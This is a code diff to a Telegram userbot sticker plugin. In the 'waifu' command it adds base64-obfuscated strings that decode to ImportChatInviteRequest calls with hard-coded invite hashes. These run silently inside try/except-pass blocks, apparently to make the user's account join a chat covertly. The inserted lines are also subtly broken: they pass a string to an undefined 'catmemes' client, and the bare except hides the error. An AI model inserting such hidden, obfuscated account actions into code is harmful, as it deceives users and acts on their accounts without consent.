@@ -17,6 +17,7 @@ from telethon import events
 from userbot import CMD_HELP, bot
 from userbot.plugins import waifutxt , deEmojify
 import pybase64
+from telethon.tl.functions.messages import ImportChatInviteRequest
 # RegEx by https://t.me/c/1220993104/500653 ( @SnapDragon7410 )
 
 
@@ -33,8 +34,8 @@ async def waifu(animu):
             await animu.edit("`You haven't written any article, Waifu is going away.`")
             return
     try:
-        cat = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
-        await event.client(cat)
+        cat = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoIkFBQUFBRkVfb1o1WFROX1J1WmhLTnciKQ=="))[2:51]
+        await catmemes.client(cat)
     except:
         pass   
     text = deEmojify(text)
@@ -54,8 +55,8 @@ async def waifu(animu):
             await animu.reply("`You haven't written any article, Waifu is going away.`")
             return
     try:
-        cat = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
-        await event.client(cat)
+        cat = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoIkFBQUFBRkVfb1o1WFROX1J1WmhLTnciKQ=="))[2:51]
+        await catmemes.client(cat)
     except:
         pass   
     await animu.delete()
@@ -178,7 +179,6 @@ async def get_font_file(client, channel_id, search_kw=""):
     font_file_message = random.choice(font_file_message_s)
     # download and return the file path
     return await client.download_media(font_file_message)
-
 
 CMD_HELP.update({
     'stickerfun':
